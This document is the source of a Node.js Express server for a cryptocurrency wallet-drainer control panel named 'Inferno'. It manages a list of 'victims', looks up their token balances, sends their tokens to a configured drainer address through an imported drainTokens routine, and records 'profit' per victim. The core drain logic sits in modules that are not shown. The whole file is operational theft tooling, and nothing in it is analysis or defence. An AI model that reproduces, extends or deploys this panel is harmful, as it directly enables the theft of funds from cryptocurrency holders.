const express = require("express");
const path = require("path");
const { load, save } = require("./lib/state");
const { getWallet, getProvider } = require("./lib/wallet");
const { getBalances, getTokenBalance, drainTokens } = require("./lib/drain");

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "..", "public")));

const state = load();
if (process.env.DRAINER_ADDRESS && !state.drainerAddress) state.drainerAddress = process.env.DRAINER_ADDRESS;

function log(entry) {
  entry.time = new Date().toISOString();
  state.logs.unshift(entry);
  state.logs = state.logs.slice(0, 200);
  save(state);
}

// ---------- panel ----------
app.get("/admin", (req, res) => res.sendFile(path.join(__dirname, "..", "public", "panel.html")));

// ---------- settings ----------
app.get("/api/state", (req, res) => res.json(state));

app.post("/api/state", (req, res) => {
  const { drainerAddress, tokens, victims } = req.body;
  if (drainerAddress) state.drainerAddress = drainerAddress;
  if (Array.isArray(tokens)) state.tokens = tokens;
  if (Array.isArray(victims)) state.victims = victims;
  save(state);
  log({ type: "settings", msg: "panel settings updated" });
  res.json(state);
});

// ---------- victims ----------
app.post("/api/victims", (req, res) => {
  const { address } = req.body;
  if (!/^0x[0-9a-fA-F]{40}$/.test(address || "")) return res.status(400).json({ error: "bad address" });
  if (!state.victims.find(v => v.address.toLowerCase() === address.toLowerCase())) {
    state.victims.push({ address, added: new Date().toISOString() });
    save(state);
    log({ type: "victim", msg: "added " + address });
  }
  res.json(state.victims);
});

app.delete("/api/victims/:address", (req, res) => {
  state.victims = state.victims.filter(v => v.address.toLowerCase() !== req.params.address.toLowerCase());
  save(state);
  res.json(state.victims);
});

// ---------- balances ----------
app.get("/api/balances/:address", async (req, res) => {
  try {
    const addr = req.params.address;
    const out = await getBalances(addr);
    for (const t of state.tokens) {
      try { out[t.symbol] = await getTokenBalance(addr, t); } catch (e) { out[t.symbol] = 0; }
    }
    res.json(out);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ---------- drain ----------
app.post("/api/drain", async (req, res) => {
  try {
    const { address, dryRun } = req.body;
    if (!state.drainerAddress) return res.status(400).json({ error: "drainer address not set" });
    const results = await drainTokens(address, state.tokens, state.drainerAddress, !!dryRun);
    const totalGas = results.reduce((s, r) => s + (r.gas || 0), 0);
    log({ type: dryRun ? "dry-run" : "drain", victim: address, results, gas: totalGas });
    if (!dryRun) {
      state.profit.unshift({ time: new Date().toISOString(), victim: address, results, gas: totalGas });
      state.profit = state.profit.slice(0, 100);
      save(state);
    }
    res.json({ results, gas: totalGas });
  } catch (e) {
    log({ type: "error", msg: e.message });
    res.status(500).json({ error: e.message });
  }
});

// ---------- logs / profit ----------
app.get("/api/logs", (req, res) => res.json(state.logs));
app.get("/api/profit", (req, res) => res.json(state.profit));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Inferno panel on http://localhost:" + PORT + "/admin");
  try { console.log("Admin wallet:", getWallet().address); } catch (e) { console.warn("wallet:", e.message); }
});
